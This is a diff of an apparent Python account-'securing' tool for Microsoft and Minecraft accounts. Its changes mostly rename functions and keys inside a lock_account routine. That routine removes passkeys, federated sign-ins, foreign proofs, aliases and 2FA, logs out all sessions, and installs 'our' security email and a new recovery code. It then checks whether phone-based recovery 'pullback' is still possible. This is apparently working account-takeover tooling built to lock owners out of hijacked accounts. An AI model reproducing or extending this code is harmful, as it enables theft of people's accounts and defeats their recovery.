@@ -1,32 +1,32 @@
-from authsecuring.utils.security.change_primary_alias import change_primary_alias
-from authsecuring.utils.security.get_security_mail import get_security_email
-from authsecuring.utils.security.add_authenticator import add_authenticator
-from authsecuring.utils.security.get_recovery_code import get_recovery_code
+from authsecuring.utils.security.change_primary_alias import promote_alias
+from authsecuring.utils.security.get_security_mail import fetch_security_mail
+from authsecuring.utils.security.add_authenticator import enroll_mfa
+from authsecuring.utils.security.get_recovery_code import mint_recovery
 from authsecuring.utils.security_information import gather_security_info
-from authsecuring.utils.security.remove_services import remove_services
-from authsecuring.utils.security.remove_devices import remove_devices
-from authsecuring.utils.security.delete_aliases import delete_aliases
-from authsecuring.utils.security.remove_proof import remove_proof
-from authsecuring.utils.security.remove_fed_cred import remove_fed_cred
-from authsecuring.utils.security.leave_family import leave_family
-from authsecuring.utils.security.remove_zyger import remove_zyger
-from authsecuring.utils.security.remove_2fa import remove_2fa
+from authsecuring.utils.security.remove_services import strip_app_links
+from authsecuring.utils.security.remove_devices import purge_devices
+from authsecuring.utils.security.delete_aliases import wipe_foreign_aliases
+from authsecuring.utils.security.remove_proof import strip_proofs
+from authsecuring.utils.security.remove_fed_cred import wipe_fed_creds
+from authsecuring.utils.security.leave_family import leave_family_group
+from authsecuring.utils.security.remove_zyger import strip_passkeys
+from authsecuring.utils.security.remove_2fa import drop_2fa
 from authsecuring.utils.security.recovery import recover
 
-from authsecuring.utils.ogi.get_subscriptions import get_subscriptions
-from authsecuring.utils.ogi.get_owner_info import get_owner_info
-from authsecuring.utils.ogi.get_contacts import get_contacts
-from authsecuring.utils.ogi.get_devices import get_devices
-from authsecuring.utils.ogi.get_family import get_family
-from authsecuring.utils.ogi.get_cards import get_cards
+from authsecuring.utils.ogi.get_subscriptions import fetch_subscriptions
+from authsecuring.utils.ogi.get_owner_info import fetch_owner
+from authsecuring.utils.ogi.get_contacts import fetch_contacts
+from authsecuring.utils.ogi.get_devices import fetch_devices
+from authsecuring.utils.ogi.get_family import fetch_family
+from authsecuring.utils.ogi.get_cards import fetch_cards
 
 from authsecuring.utils.cookies.get_cookies import get_cookies
 from authsecuring.utils.cookies.get_amrp import get_amrp
 from authsecuring.utils.cookies.get_amc import get_amc
 from authsecuring.utils.cookies.get_t import get_t
-from authsecuring.utils.cookies.safe_cookies import iter_cookies
+from authsecuring.utils.cookies.safe_cookies import iter_cookie_jar
 
-from authsecuring.utils.security.logout_all import logout_all
+from authsecuring.utils.security.logout_all import kick_sessions
 
 from mc.get_profile import fetch_profile
 from mc.get_ssid import fetch_ssid
@@ -59,7 +59,7 @@ def _stash_cookies(src: httpx.AsyncClient) -> httpx.Cookies:
     from http.cookiejar import Cookie as JarCookie
 
     jar = httpx.Cookies()
-    for c in iter_cookies(src):
+    for c in iter_cookie_jar(src):
         secure = bool(getattr(c, "secure", False)) or c.name.startswith(
             ("__Host-", "__Secure-")
         )
@@ -147,7 +147,7 @@ async def _probe_mc(session: httpx.AsyncClient, account_info: dict) -> str:
     'ok' | 'no_java' | 'no_mc' | 'transient'
     """
     print("[~] - Checking Minecraft Account")
-    sec_mail = (account_info.get("microsoft") or {}).get("sec_mail")
+    sec_mail = (account_info.get("microsoft") or {}).get("security_email")
     if sec_mail in (None, "", "Couldn't Change!", "Unknown", "N/A"):
         sec_mail = None
     xbl_client = await _xbl_client(session)
@@ -441,7 +441,7 @@ async def lock_account(
         rom.warning("skipping remove_2fa — no apiCanary")
 
     ms = account_info.get("microsoft") or {}
-    old_recovery = ms.get("recov_code")
+    old_recovery = ms.get("recovery_code")
     got_recovery = bool(
         old_recovery and old_recovery not in ("Couldn't Change!", "Failed to generate")
     )
@@ -458,7 +458,7 @@ async def lock_account(
         sec_params = json.loads(
             await gather_security_info(
                 session,
-                sec_mail=ms.get("sec_mail"),
+                sec_mail=ms.get("security_email"),
                 account_email=ms.get("email"),
                 password=mfa_pwd,
                 skip_i5600_otp=skip_i5600,
@@ -540,20 +540,20 @@ async def lock_account(
     if skip_mc:
         account_info["microsoft"]["email"] = main_email or account_info["microsoft"]["email"]
         account_info["microsoft"]["password"] = "Unknown"
-        account_info["microsoft"]["recov_code"] = recov_code
+        account_info["microsoft"]["recovery_code"] = recov_code
 
         # Get security mail
         sec_mail = await fetch_security_mail(session)
-        account_info["microsoft"]["sec_mail"] = sec_mail
+        account_info["microsoft"]["security_email"] = sec_mail
         print(f"[+] - Got Security Email | {sec_mail}")
     else:
-        account_info["microsoft"]["recov_code"] = recov_code
+        account_info["microsoft"]["recovery_code"] = recov_code
 
     if not skip_mc:
 
         # Pass Keys / Windows Hello / FedCred (Samsung+Apple sign-in) / proofs
         if canary:
-            await remove_zyger(session, canary)
+            await strip_passkeys(session, canary)
             # Sign in with Samsung/Apple/Google/… — RemoveFedCred, not DeleteProof
             try:
                 fed = await wipe_fed_creds(session, canary)
@@ -565,7 +565,7 @@ async def lock_account(
             # Wipe foreign proofs / passkeys (iCloud Keychain, Samsung Pass,
             # Google Password Manager via RemovePasskey) / auth apps —
             # keep OUR recovery security email.
-            keep_sec_mail = (account_info.get("microsoft") or {}).get("sec_mail")
+            keep_sec_mail = (account_info.get("microsoft") or {}).get("security_email")
             proof_wipe = await strip_proofs(
                 session,
                 canary,
@@ -658,7 +658,7 @@ async def lock_account(
                         session,
                         new_alias,
                         canary,
-                        sec_mail=ms.get("sec_mail"),
+                        sec_mail=ms.get("security_email"),
                         account_email=ms.get("original_email") or ms.get("email") or main_email,
                         password=ms.get("password"),
                     )
@@ -806,8 +806,8 @@ async def lock_account(
                 raise
 
             if data and data != "invalid":
-                account_info["microsoft"]["sec_mail"] = sec_mail
-                account_info["microsoft"]["recov_code"] = data
+                account_info["microsoft"]["security_email"] = sec_mail
+                account_info["microsoft"]["recovery_code"] = data
                 account_info["microsoft"]["password"] = password
             else:
                 print(f"[X] - [x] secure failed this account")
@@ -829,7 +829,7 @@ async def lock_account(
             await wipe_foreign_aliases(
                 session,
                 keep_email=ms_now.get("email"),
-                sec_mail=ms_now.get("sec_mail"),
+                sec_mail=ms_now.get("security_email"),
                 account_email=ms_now.get("original_email") or ms_now.get("email"),
                 password=clean_password(ms_now.get("password")),
             )
@@ -894,7 +894,7 @@ async def lock_account(
                 cred_map = (cred_probe or {}).get("Credentials") or {}
                 raw_phone = cred_map.get("HasPhone")
                 phone_flag = raw_phone in (1, "1", True)
-                account_info["microsoft"]["phone_flag"] = phone_flag
+                account_info["microsoft"]["has_phone"] = phone_flag
                 if phone_flag:
                     print(
                         "[!] - HasPhone=1 after proof proof_wipe — SMS/ACSR pullback still possible"
@@ -902,10 +902,10 @@ async def lock_account(
                 else:
                     print("[+] - HasPhone cleared (no phone recovery flag)")
             else:
-                account_info["microsoft"]["phone_flag"] = None
+                account_info["microsoft"]["has_phone"] = None
         except Exception as exc:
             logging.warning("HasPhone probe soft-skip: %s", exc)
-            account_info["microsoft"]["phone_flag"] = None
+            account_info["microsoft"]["has_phone"] = None
         
     print("[+] - [+] secured")
     return account_info
